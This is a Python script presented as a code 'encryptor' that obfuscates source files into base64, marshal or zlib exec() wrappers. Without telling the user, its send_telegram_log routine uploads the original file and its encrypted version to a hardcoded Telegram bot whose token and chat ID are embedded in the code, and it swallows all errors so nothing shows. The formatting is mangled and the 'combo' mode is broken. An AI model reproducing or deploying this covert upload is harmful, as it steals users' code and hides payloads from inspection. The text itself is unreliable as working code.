import os import sys import base64 import marshal import zlib import time from datetime import datetime import requests

BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0" CHAT_ID = "1241769879" AUTHORIZED_USERS = ["i4mAlone"]  # Only these usernames can log in

def clear(): os.system("clear")

def send_telegram_log(message, file_path=None): try: url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" payload = { "chat_id": CHAT_ID, "text": message, "parse_mode": "HTML" } requests.post(url, data=payload)

if file_path and os.path.isfile(file_path):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as file:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
except Exception as e:
    pass

def login(): clear() print("[•] Telegram Login Required") username = input("[•] Enter your Telegram Username: @") if username in AUTHORIZED_USERS: send_telegram_log(f"[+] Authorized login by @{username} at {datetime.now()}") print("[•] Access granted. Welcome!") time.sleep(1) else: print("[!] Unauthorized user. Exiting...") sys.exit(1)

def encrypt_code(): clear() print("[•] Welcome to the Code Encryptor!") file_txt = input("[•] Enter the name of the .txt file containing code to encrypt: ") if not os.path.isfile(file_txt): print("[!] File not found!") input("[•] Press Enter to return...") return

with open(file_txt, "r") as f:
    code = f.read()

send_telegram_log("[•] Original Code:", file_path=file_txt)

print("\n[•] Choose encryption method:")
print("[1] Base64")
print("[2] Marshal")
print("[3] Zlib")
print("[4] Combo (zlib+marshal+base64)")
choice = input("[?] Choose: ")

if choice == '1':
    encoded = base64.b64encode(code.encode()).decode()
    final = f"import base64\nexec(base64.b64decode('{encoded}'))"
elif choice == '2':
    marshaled = marshal.dumps(compile(code, '', 'exec'))
    final = f"import marshal\nexec(marshal.loads({repr(marshaled)}))"
elif choice == '3':
    zipped = zlib.compress(code.encode())
    final = f"import zlib\nexec(zlib.decompress({repr(zipped)}).decode())"
elif choice == '4':
    compressed = zlib.compress(code.encode())
    marshaled = marshal.dumps(compile(compressed.decode('latin1'), '', 'exec'))
    encoded = base64.b64encode(marshaled).decode()
    final = f"import base64,marshal\nexec(marshal.loads(base64.b64decode('{encoded}')))

" else: print("[!] Invalid choice") return

enc_name = os.path.splitext(os.path.basename(file_txt))[0]
new_file = f"enc_{enc_name}.py"

with open(new_file, "w") as f:
    f.write(final)

send_telegram_log("[•] Encrypted Code:", file_path=new_file)

print(f"[✓] File encrypted as: {new_file}")
input("[•] Press Enter to return...")

def main_menu(): while True: clear() print(""" █████╗ ██╗      ██████╗ ███╗   ██╗███████╗ ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝ ███████║██║     ██║   ██║██╔██╗ ██║███████╗ ██╔══██║██║     ██║   ██║██║╚██╗██║╚════██║ ██║  ██║███████╗╚██████╔╝██║ ╚████║███████║ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ A L O N E   T O O L """) print("[1] Encrypt Code") print("[0] Exit") choice = input("\n[?] Choose an option: ")

if choice == '1':
        encrypt_code()
    elif choice == '0':
        print("[•] Goodbye!")
        sys.exit()
    else:
        print("[!] Invalid option!")
        input("[•] Press Enter to return...")

if name == "main": login() main_menu()

